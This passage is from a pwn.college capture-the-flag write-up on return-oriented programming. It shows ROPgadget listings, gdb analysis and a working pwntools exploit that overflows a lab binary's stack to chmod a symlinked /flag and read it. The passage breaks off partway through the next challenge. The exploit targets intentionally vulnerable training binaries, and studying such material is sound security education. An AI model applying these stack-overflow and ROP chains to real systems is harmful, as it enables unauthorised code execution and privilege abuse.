0x0000000000401100 : endbr64 ; ret
0x000000000040203d : fadd dword ptr [r9 + 0x5a] ; ret
0x000000000040203e : fadd dword ptr [rcx + 0x5a] ; ret
0x00000000004021ac : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010fe : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401125 : je 0x401130 ; mov edi, 0x405050 ; jmp rax
0x0000000000401167 : je 0x401170 ; mov edi, 0x405050 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011b4 : jmp 0x401140
0x000000000040100b : jmp 0x4840104f
0x000000000040112c : jmp rax
0x000000000040209b : leave ; ret
0x000000000040112d : loopne 0x401195 ; nop ; ret
0x0000000000402036 : loopne 0x402092 ; ret
0x0000000000401196 : mov byte ptr [rip + 0x3ecb], 1 ; pop rbp ; ret
0x0000000000402054 : mov dword ptr [rbp - 0x40], 0xc35941 ; nop ; pop rbp ; ret
0x000000000040214e : mov eax, 0 ; leave ; ret
0x0000000000401127 : mov edi, 0x405050 ; jmp rax
0x00000000004010ff : nop ; endbr64 ; ret
0x000000000040209a : nop ; leave ; ret
0x0000000000402009 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200a : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200b : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200c : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200d : nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200e : nop ; nop ; nop ; pop rbp ; ret
0x000000000040200f : nop ; nop ; pop rbp ; ret
0x0000000000402010 : nop ; pop rbp ; ret
0x000000000040112f : nop ; ret
0x00000000004011ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401140
0x0000000000401126 : or dword ptr [rdi + 0x405050], edi ; jmp rax
0x000000000040203f : pop r10 ; ret
0x00000000004021bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004021be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004021c0 : pop r14 ; pop r15 ; ret
0x00000000004021c2 : pop r15 ; ret
0x000000000040201f : pop r8 ; ret
0x0000000000402057 : pop r9 ; ret
0x0000000000402020 : pop rax ; ret
0x00000000004021bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004021bf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040119d : pop rbp ; ret
0x0000000000402058 : pop rcx ; ret
0x0000000000402047 : pop rdi ; ret
0x0000000000402037 : pop rdx ; ret
0x00000000004021c1 : pop rsi ; pop r15 ; ret
0x0000000000402027 : pop rsi ; ret
0x00000000004021bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401129 : push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401128 : push rax ; push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x000000000040101a : ret
0x0000000000401198 : retf
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004021dd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004021dc : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040204f : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401123 : test eax, eax ; je 0x401130 ; mov edi, 0x405050 ; jmp rax
0x0000000000401165 : test eax, eax ; je 0x401170 ; mov edi, 0x405050 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 93
```

### ROP chain

The ROP chain will be the same as the [easy version](#rop-chain-5).

### Exploit

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initialize values
pop_rax = 0x402020
pop_rdi = 0x402047
pop_rsi_pop_r15 = 0x4021c1
syscall = 0x40204f
bang_addr = 0x403030

buffer_addr = 0x7ffdc51a0330
ret_addr = 0x7ffdc51a0378

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop2-hard')

# Craft payload
payload = flat(
    b"A" * offset,

    # chmod("!", 0o777)
    pop_rdi, bang_addr,
    pop_rsi_pop_r15, 0o777, b"B" * 8,
    pop_rax, 90,
    syscall
)

# Send the payload
p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop2-hard': pid 13446
[*] Switching to interactive mode
[*] Process '/challenge/stop-pop-and-rop2-hard' stopped with exit code -11 (SIGSEGV) (pid 13446)
###
### Welcome to /challenge/stop-pop-and-rop2-hard!
###

Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ cat /flag 
pwn.college{0dY0MtDlT_gkfSSrek3AId3RaXP.0FM1MDL4ITM0EzW}
```

&nbsp;

## Indirect Invocation (Easy)

```
hacker@return-oriented-programming~indirect-invocation-easy:~$ /challenge/indirect-invocation-easy 
###
### Welcome to /challenge/indirect-invocation-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

```

This time there is no `syscall` gadget. 

### Binary Analysis

Let's look at what gadgets are there.

```
hacker@return-oriented-programming~indirect-invocation-easy:/$ ROPgadget --binary /challenge/indirect-invocation-easy 
Gadgets information
============================================================
0x00000000004016c7 : adc eax, 0xc9fffffb ; ret
0x000000000040121d : add ah, dh ; nop ; endbr64 ; ret
0x000000000040124b : add bh, bh ; loopne 0x4012b5 ; nop ; ret
0x00000000004022f5 : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000402345 : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x00000000004015af : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
0x0000000000402299 : add byte ptr [rax - 0x39], cl ; loopne 0x4022fe ; ret
0x0000000000401544 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401542 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401332 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004024ec : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401334 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004015b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
0x000000000040167f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
0x00000000004016fd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
0x0000000000402478 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000402479 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004012ba : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004024ee : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040121c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401336 : add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004015b6 : add byte ptr [rax], al ; jmp 0x401648
0x0000000000401681 : add byte ptr [rax], al ; jmp 0x4016af
0x00000000004016ff : add byte ptr [rax], al ; jmp 0x401726
0x000000000040247a : add byte ptr [rax], al ; leave ; ret
0x00000000004022a0 : add byte ptr [rax], al ; nop ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004012bb : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040247b : add cl, cl ; ret
0x000000000040124a : add dil, dil ; loopne 0x4012b5 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x00000000004012bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040132f : add eax, 0x3d88 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004012b7 : add eax, 0x3dfb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000402352 : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000402276 : call qword ptr [rax + 0xff3c35d]
0x0000000000401737 : call qword ptr [rax + 0xff3c3c9]
0x00000000004014cc : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004015b3 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
0x0000000000402285 : clc ; pop rcx ; ret
0x00000000004016fc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
0x00000000004012d3 : cli ; jmp 0x401260
0x0000000000401223 : cli ; ret
0x00000000004022f2 : cli ; sub eax, 0x29480000 ; ret 0x8948
0x00000000004024fb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401331 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004012b9 : cmp eax, 0x5d010000 ; ret
0x000000000040121b : cmp eax, 0x90f40000 ; endbr64 ; ret
0x0000000000401248 : cwde ; push rax ; add dil, dil ; loopne 0x4012b5 ; nop ; ret
0x00000000004016ca : dec ecx ; ret
0x00000000004012d0 : endbr64 ; jmp 0x401260
0x0000000000401220 : endbr64 ; ret
0x00000000004024cc : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040167e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
0x000000000040121e : hlt ; nop ; endbr64 ; ret
0x00000000004024aa : in al, dx ; or al, ch ; jmp 0x4024af
0x00000000004016f9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
0x000000000040167b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
0x0000000000401547 : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401245 : je 0x401250 ; mov edi, 0x405098 ; jmp rax
0x0000000000401287 : je 0x401290 ; mov edi, 0x405098 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004012d4 : jmp 0x401260
0x0000000000401338 : jmp 0x4014b0
0x00000000004015b8 : jmp 0x401648
0x0000000000401683 : jmp 0x4016af
0x0000000000401669 : jmp 0x4016b5
0x000000000040150f : jmp 0x4016cb
0x0000000000401701 : jmp 0x401726
0x00000000004024ae : jmp 0x4024af
0x000000000040100b : jmp 0x4840104f
0x000000000040124c : jmp rax
0x00000000004014cf : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004016cb : leave ; ret
0x000000000040124d : loopne 0x4012b5 ; nop ; ret
0x000000000040229d : loopne 0x4022fe ; ret
0x00000000004012b6 : mov byte ptr [rip + 0x3dfb], 1 ; pop rbp ; ret
0x0000000000401330 : mov byte ptr [rip], bh ; add byte ptr [rax], al ; jmp 0x4014b0
0x000000000040229b : mov dword ptr [rbp - 0x20], 0xc35f ; nop ; pop rbp ; ret
0x000000000040167c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x4016af
0x00000000004016fa : mov dword ptr [rbp - 4], 0 ; jmp 0x401726
0x00000000004015b1 : mov dword ptr [rbp - 8], 0 ; jmp 0x401648
0x0000000000402477 : mov eax, 0 ; leave ; ret
0x0000000000401247 : mov edi, 0x405098 ; jmp rax
0x00000000004015b0 : mov qword ptr [rbp - 8], 0 ; jmp 0x401648
0x0000000000402342 : movabs byte ptr [0x8948d1294800002d], al ; retf 0x148
0x000000000040121f : nop ; endbr64 ; ret
0x0000000000401738 : nop ; leave ; ret
0x0000000000402251 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402252 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402253 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402254 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402255 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402256 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000402257 : nop ; nop ; pop rbp ; ret
0x0000000000402258 : nop ; pop rbp ; ret
0x000000000040124f : nop ; ret
0x00000000004012cc : nop dword ptr [rax] ; endbr64 ; jmp 0x401260
0x00000000004024ab : or al, ch ; jmp 0x4024af
0x0000000000401246 : or dword ptr [rdi + 0x405098], edi ; jmp rax
0x0000000000401105 : or eax, 0xf2000000 ; jmp 0x401020
0x00000000004024dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014d3 : pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004024de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014d5 : pop r13 ; pop rbp ; ret
0x00000000004024e0 : pop r14 ; pop r15 ; ret
0x00000000004024e2 : pop r15 ; ret
0x00000000004024db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004024df : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004014d6 : pop rbp ; pop rbp ; ret
0x00000000004012bd : pop rbp ; ret
0x00000000004014d2 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000402286 : pop rcx ; ret
0x000000000040229e : pop rdi ; ret
0x000000000040228e : pop rdx ; ret
0x00000000004024e1 : pop rsi ; pop r15 ; ret
0x0000000000402296 : pop rsi ; ret
0x00000000004024dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014d4 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401249 : push rax ; add dil, dil ; loopne 0x4012b5 ; nop ; ret
0x0000000000402390 : push rsp ; sub eax, 0x29480000 ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040101a : ret
0x000000000040153f : ret 0x40be
0x0000000000402355 : ret 0x458b
0x00000000004022f8 : ret 0x8948
0x00000000004023a5 : ret 0x8b48
0x00000000004014ef : ret 0x8be
0x0000000000402319 : retf
0x000000000040234b : retf 0x148
0x00000000004023a2 : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000402348 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004012b8 : sti ; cmp eax, 0x5d010000 ; ret
0x00000000004022f3 : sub eax, 0x29480000 ; ret 0x8948
0x0000000000402343 : sub eax, 0x29480000 ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x00000000004024fd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004024fc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401243 : test eax, eax ; je 0x401250 ; mov edi, 0x405098 ; jmp rax
0x0000000000401285 : test eax, eax ; je 0x401290 ; mov edi, 0x405098 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 149
```

We still have the classic `pop` gadgets which set the values of registers. So we can still set up a syscall.

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

As for the invocation of the syscall, even if we cannot directly do it, we can leverage the PLT stubs which are present in the binary.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401110  putchar@plt
0x0000000000401120  __errno_location@plt
0x0000000000401130  puts@plt
0x0000000000401140  cs_free@plt
0x0000000000401150  printf@plt
0x0000000000401160  read@plt
0x0000000000401170  strcmp@plt
0x0000000000401180  cs_disasm@plt
0x0000000000401190  mincore@plt
0x00000000004011a0  sendfile@plt
0x00000000004011b0  setvbuf@plt
0x00000000004011c0  cs_open@plt
0x00000000004011d0  open@plt
0x00000000004011e0  cs_close@plt
0x00000000004011f0  _start
0x0000000000401220  _dl_relocate_static_pie
0x0000000000401230  deregister_tm_clones
0x0000000000401260  register_tm_clones
0x00000000004012a0  __do_global_dtors_aux
0x00000000004012d0  frame_dummy
0x00000000004012d6  DUMP_STACK
0x00000000004014d9  print_gadget
0x00000000004016cd  print_chain
0x000000000040173b  bin_padding
0x000000000040225b  force_import
0x000000000040227a  free_gadgets
0x00000000004022a5  challenge
0x00000000004023c6  main
0x0000000000402480  __libc_csu_init
0x00000000004024f0  __libc_csu_fini
0x00000000004024f8  _fini
```

We can use the `open@plt`, `read@plt` and `puts@plt`.

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004022a5 <+0>:     endbr64
   0x00000000004022a9 <+4>:     push   rbp
   0x00000000004022aa <+5>:     mov    rbp,rsp
   0x00000000004022ad <+8>:     sub    rsp,0x70
   0x00000000004022b1 <+12>:    mov    DWORD PTR [rbp-0x54],edi
   0x00000000004022b4 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
   0x00000000004022b8 <+19>:    mov    QWORD PTR [rbp-0x68],rdx
   0x00000000004022bc <+23>:    lea    rdi,[rip+0xed5]        # 0x403198
   0x00000000004022c3 <+30>:    call   0x401130 <puts@plt>
   0x00000000004022c8 <+35>:    lea    rdi,[rip+0xf41]        # 0x403210
   0x00000000004022cf <+42>:    call   0x401130 <puts@plt>
   0x00000000004022d4 <+47>:    mov    rax,rsp
   0x00000000004022d7 <+50>:    mov    QWORD PTR [rip+0x2e12],rax        # 0x4050f0 <sp_>
   0x00000000004022de <+57>:    mov    rax,rbp
   0x00000000004022e1 <+60>:    mov    QWORD PTR [rip+0x2de8],rax        # 0x4050d0 <bp_>
   0x00000000004022e8 <+67>:    mov    rdx,QWORD PTR [rip+0x2de1]        # 0x4050d0 <bp_>
   0x00000000004022ef <+74>:    mov    rax,QWORD PTR [rip+0x2dfa]        # 0x4050f0 <sp_>
   0x00000000004022f6 <+81>:    sub    rdx,rax
   0x00000000004022f9 <+84>:    mov    rax,rdx
   0x00000000004022fc <+87>:    shr    rax,0x3
   0x0000000000402300 <+91>:    add    rax,0x2
   0x0000000000402304 <+95>:    mov    QWORD PTR [rip+0x2dd5],rax        # 0x4050e0 <sz_>
   0x000000000040230b <+102>:   mov    rax,QWORD PTR [rip+0x2dbe]        # 0x4050d0 <bp_>
   0x0000000000402312 <+109>:   add    rax,0x8
   0x0000000000402316 <+113>:   mov    QWORD PTR [rip+0x2dcb],rax        # 0x4050e8 <rp_>
   0x000000000040231d <+120>:   lea    rax,[rbp-0x50]
   0x0000000000402321 <+124>:   mov    edx,0x1000
   0x0000000000402326 <+129>:   mov    rsi,rax
   0x0000000000402329 <+132>:   mov    edi,0x0
   0x000000000040232e <+137>:   call   0x401160 <read@plt>
   0x0000000000402333 <+142>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000402336 <+145>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402339 <+148>:   cdqe
   0x000000000040233b <+150>:   lea    rcx,[rbp-0x50]
   0x000000000040233f <+154>:   mov    rdx,QWORD PTR [rip+0x2da2]        # 0x4050e8 <rp_>
   0x0000000000402346 <+161>:   sub    rcx,rdx
   0x0000000000402349 <+164>:   mov    rdx,rcx
   0x000000000040234c <+167>:   add    rax,rdx
   0x000000000040234f <+170>:   shr    rax,0x3
   0x0000000000402353 <+174>:   mov    rdx,rax
   0x0000000000402356 <+177>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402359 <+180>:   mov    esi,eax
   0x000000000040235b <+182>:   lea    rdi,[rip+0xf16]        # 0x403278
   0x0000000000402362 <+189>:   mov    eax,0x0
   0x0000000000402367 <+194>:   call   0x401150 <printf@plt>
   0x000000000040236c <+199>:   lea    rdi,[rip+0xf3d]        # 0x4032b0
   0x0000000000402373 <+206>:   call   0x401130 <puts@plt>
   0x0000000000402378 <+211>:   lea    rdi,[rip+0xf99]        # 0x403318
   0x000000000040237f <+218>:   call   0x401130 <puts@plt>
   0x0000000000402384 <+223>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402387 <+226>:   cdqe
   0x0000000000402389 <+228>:   lea    rcx,[rbp-0x50]
   0x000000000040238d <+232>:   mov    rdx,QWORD PTR [rip+0x2d54]        # 0x4050e8 <rp_>
   0x0000000000402394 <+239>:   sub    rcx,rdx
   0x0000000000402397 <+242>:   mov    rdx,rcx
   0x000000000040239a <+245>:   add    rax,rdx
   0x000000000040239d <+248>:   shr    rax,0x3
   0x00000000004023a1 <+252>:   add    eax,0x1
   0x00000000004023a4 <+255>:   mov    edx,eax
   0x00000000004023a6 <+257>:   mov    rax,QWORD PTR [rip+0x2d3b]        # 0x4050e8 <rp_>
   0x00000000004023ad <+264>:   mov    esi,edx
   0x00000000004023af <+266>:   mov    rdi,rax
   0x00000000004023b2 <+269>:   call   0x4016cd <print_chain>
   0x00000000004023b7 <+274>:   lea    rdi,[rip+0xf9c]        # 0x40335a
   0x00000000004023be <+281>:   call   0x401130 <puts@plt>
   0x00000000004023c3 <+286>:   nop
   0x00000000004023c4 <+287>:   leave
   0x00000000004023c5 <+288>:   ret
End of assembler dump.
```

We can set a breakpoint at `challenge+137` and run.

```
pwndbg> break *(challenge+137)
Breakpoint 1 at 0x40232e
```

```
pwndbg> run
Starting program: /challenge/indirect-invocation-easy 
###
### Welcome to /challenge/indirect-invocation-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!


Breakpoint 1, 0x000000000040232e in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
 RAX  0x7ffcd4fe1ae0 ◂— 0
 RBX  0x402480 (__libc_csu_init) ◂— endbr64 
 RCX  0x71c72cf3b297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7ffcd4fe1ae0 ◂— 0
 R8   0x61
 R9   0x34
 R10  0x4005ec ◂— 0x72616863747570 /* 'putchar' */
 R11  0x246
 R12  0x4011f0 (_start) ◂— endbr64 
 R13  0x7ffcd4fe1c50 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffcd4fe1b30 —▸ 0x7ffcd4fe1b60 ◂— 0
 RSP  0x7ffcd4fe1ac0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RIP  0x40232e (challenge+137) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
 ► 0x40232e <challenge+137>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7ffcd4fe1ae0 ◂— 0
        nbytes: 0x1000
 
   0x402333 <challenge+142>    mov    dword ptr [rbp - 4], eax
   0x402336 <challenge+145>    mov    eax, dword ptr [rbp - 4]
   0x402339 <challenge+148>    cdqe   
   0x40233b <challenge+150>    lea    rcx, [rbp - 0x50]
   0x40233f <challenge+154>    mov    rdx, qword ptr [rip + 0x2da2]     RDX, [rp_]
   0x402346 <challenge+161>    sub    rcx, rdx
   0x402349 <challenge+164>    mov    rdx, rcx
   0x40234c <challenge+167>    add    rax, rdx
   0x40234f <challenge+170>    shr    rax, 3
   0x402353 <challenge+174>    mov    rdx, rax
─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffcd4fe1ac0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-068     0x7ffcd4fe1ac8 —▸ 0x7ffcd4fe1c68 —▸ 0x7ffcd4fe2681 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060     0x7ffcd4fe1ad0 —▸ 0x7ffcd4fe1c58 —▸ 0x7ffcd4fe265d ◂— '/challenge/indirect-invocation-easy'
03:0018│-058     0x7ffcd4fe1ad8 ◂— 0x100000000
04:0020│ rax rsi 0x7ffcd4fe1ae0 ◂— 0
05:0028│-048     0x7ffcd4fe1ae8 —▸ 0x71c72cebde93 (_IO_file_overflow+275) ◂— cmp eax, -1
06:0030│-040     0x7ffcd4fe1af0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-038     0x7ffcd4fe1af8 ◂— 0xa /* '\n' */
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40232e challenge+137
   1         0x40246b main+165
   2   0x71c72ce51083 __libc_start_main+243
   3         0x40121e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Lets get the address of te stored return pointer.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffcd4fe1b40:
 rip = 0x40232e in challenge; saved rip = 0x40246b
 called by frame at 0x7ffcd4fe1b70
 Arglist at 0x7ffcd4fe1b30, args: 
 Locals at 0x7ffcd4fe1b30, Previous frame's sp is 0x7ffcd4fe1b40
 Saved registers:
  rbp at 0x7ffcd4fe1b30, rip at 0x7ffcd4fe1b38
```

Now we can calculate the offset.

```
pwndbg> p/d 0x7ffcd4fe1b38 - 0x7ffcd4fe1ae0
$1 = 88
```

- [x] Offset between buffer and stored return address to `main()`: `88`
   - Buffer address: `0x7ffcd4fe1ae0`
   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
- [ ] Location of a NULL terminated string
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

Let's find a string we can use a symlink.

```
hacker@return-oriented-programming~indirect-invocation-easy:/$ objdump -s -j .rodata /challenge/indirect-invocation-easy | grep -E "[0-9a-f]{2}00"
 403000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
 403050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
 403070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
 403090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
 4030e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
 403100 6c657220 6661696c 65642074 6f20696e  ler failed to in
 403110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
 403120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
 403140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
 403150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
 403160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
 403190 61742025 702e0a00 54686973 20636861  at %p...This cha
 403200 20746869 73207365 72696573 206f6600   this series of.
 403270 00000000 00000000 52656365 69766564  ........Received
 4032a0 64206761 64676574 732e0a00 00000000  d gadgets.......
 403300 67657473 20617265 20657865 63757461  gets are executa
 403310 626c6500 00000000 66726f6d 20776974  ble.....from wit
 403350 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
 403360 67210023 23230023 23232057 656c636f  g!.###.### Welco
 403370 6d652074 6f202573 210a0023 23232047  me to %s!..### G
 403380 6f6f6462 79652100                    oodbye!.
```

- [x] Offset between buffer and stored return address to `main()`: `88`
   - Buffer address: `0x7ffcd4fe1ae0`
   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
- [x] Location of a NULL terminated string: `0x403386`
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

Let's get the address of the `.bss` section so that we can read the flag.

```
pwndbg> info files
Symbols from "/challenge/indirect-invocation-easy".
Local exec file:
        `/challenge/indirect-invocation-easy', file type elf64-x86-64.
        Entry point: 0x4011f0
        0x0000000000400318 - 0x0000000000400334 is .interp
        0x0000000000400338 - 0x0000000000400358 is .note.gnu.property
        0x0000000000400358 - 0x000000000040037c is .note.gnu.build-id
        0x000000000040037c - 0x000000000040039c is .note.ABI-tag
        0x00000000004003a0 - 0x00000000004003c8 is .gnu.hash
